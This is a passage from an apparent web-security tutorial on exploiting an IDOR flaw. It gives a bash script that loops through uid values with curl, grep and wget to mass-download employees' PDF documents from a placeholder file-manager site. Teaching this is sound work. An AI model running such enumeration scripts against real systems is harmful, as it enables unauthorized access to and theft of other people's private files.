We can try manually accessing resources with `uid=3`, `uid=4`, and so on. However, this is impractical in real-world environments with hundreds of thousands of resources.
So we either use a tool like Burp Intruder or ZAP Fuzzer to retrieve all data or write a simple bash script.

In this example, we will use the following bash script to download all the files from a FIle Manager web app.
```bash
#!/bin/bash

url="http://target-website.com"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
When we run the script, it will download all documents from all employees with `uids` between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees.